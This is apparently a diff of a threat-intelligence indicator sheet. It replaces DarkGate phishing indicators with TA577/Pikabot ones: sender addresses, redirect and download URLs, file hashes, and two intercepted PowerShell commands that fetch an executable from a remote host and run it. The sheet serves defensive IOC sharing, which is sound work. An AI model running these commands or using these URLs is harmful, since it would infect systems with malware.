@@ -1,62 +1,47 @@
+THREAT IDENTIFICATION: TA577 / PIKABOT
 
-THREAT IDENTIFICATION:  DARKGATE
+SUBJECTS OBSERVED
+Confiidenial Merriit and AIP
 
-OBSERVED SUBJECTS
-Courier Service Fees - 1-28-24
-Delivery Service Fees - 1-28-24
+SENDERS OBSERVED
+cturner@memoryadvocatepeers.org
 
-OBSERVED SENDERS
-auto-reply@howtocreatgpts.com
-office@howtocreatgpts.com
-system@foreignexchangeearnings.com
+INFECTION FLOW
+eml -> url -> zip -> js -> ps -> dll
 
-Reply to email address for all 3:
-support@fscs5.com
+INITIAL REDIRECT URL FROM EMAIL
+https://cigarette-electronique-luxe.com/dbuh/?91804332
 
-PDF FILE HASHES
-285c0f5eb3cd9aecfdd1b9311be97463
-7a49414efe888dc49318b87161e85879
-8efd6f30dd19229737cde3c982a16424
-(All files that I saw were all named: "attachment_-[0-9]{10}\.pdf)
+ZIP FILE DOWNLOAD URL
+https://cigarette-electronique-luxe.com/dbuh//?jaaJNUf7Sq=1707411142
 
-KEITARO TDS URL
-https://adclick.g.doubleclick.net//pcs/click?f1844aao2-24-ZcBdUOnedriveSvkd&&adurl=////asareholdings.com/?utm_content=bFvTrjuDJE&session_id=CTlYnmz1mj3HeYReRfPe&id=rgCyX&filter=IOzpvpQwNI-AgmJl&lang=zh&locale=FR
+ZIP FILE HASH
+Notesal.zip
+cd8753d3df4979824a92adda5b872e66
 
-https://adclick.g.doubleclick.net//pcs/click?f8343wzv2-2024-BsYxUONEVikd&&adurl=////asareholdings.com/?utm_content=FRnaHTMerS&session_id=G0PX6cEAQ6NNFXAkCwmV&id=77OFg&filter=YQTRpLPqMS-JPyiU&lang=fr&locale=GB
+JAVASCRIPT FILE HASH
+Notesal.js
+e69f3f6aa00817484c5886e0c0c400b7
 
-https://adclick.g.doubleclick.net//pcs/click?f8948zmr3-24-TbMnIONEYakd&&adurl=////asareholdings.com/?utm_content=pVgKxlMkTP&session_id=aM2VfW58SumkgB2BHz0d&id=UbRAA&filter=fXOOXibKgy-gZzwG&lang=fr&locale=JP
+ADDITIONAL FILE HASH (POSSIBLY A DECOY)
+j
+b53fe54f247e4dc41b32669059f8052e
 
-NEXT REDIRECT URL
-https://asareholdings.com/?utm_content=bFvTrjuDJE
-https://asareholdings.com/?utm_content=FRnaHTMerS
-https://asareholdings.com/?utm_content=pVgKxlMkTP
+FIRST INTERCEPTED POWERSHELL SCRIPT
+"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" Invoke-WebRequest https://gloverstech.com/tJWz9/0.3532479838866095.dat -OutFile C:\Users\Public\Jrdhtjydhjf.exe; saps C:\Users\Public\Jrdhtjydhjf.exe
 
-CAB FILE DOWNLOAD URL
-https://www.fiumine.com/wp-content/uploads/sucuri/attachment_7467819.cab
+SECOND INTERCEPTED POWERSHELL SCRIPT
+"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" Invoke-WebRequest 0.03497118787038539.dat -OutFile C:\Users\Public\Jrdhtjydhjf.exe; saps C:\Users\Public\Jrdhtjydhjf.exe
 
-CAB FILE HASH
-attachment_7467819.cab
-72a7e431caa865d2817274c539cc6555
+PAYLOAD DOWNLOAD URL
+https://gloverstech.com/tJWz9/0.3532479838866095.dat
 
-URL FILE HASH
-attachment_7467819.url
-1a05456bbdd73ad9e31ca5a8d1ae5cae
+PAYLOAD FILE HASH
+I did not get a payload.
 
-URL FILE PROPERTIES
-file://5.181.159.23@80/Downloads/reincarnation.zip/reincarnation.msi
+PIKABOT C2
+I did not get a payload.
 
-MSI FILE DOWNLOAD URL
-http://5.181.159.23/Downloads/reincarnation.zip/reincarnation.msi
 
-MSI FILE HASH
-reincarnation.msi
-4b2e289610400400a87a347ac2010c59
-
-AUTOIT SCRIPT FILE HASH
-script.au3
-51cac8ad7fca3b404d7bb89beef8890b
-
-DARKGATE C2s
-stachmentsuprimeresult.com
 
 
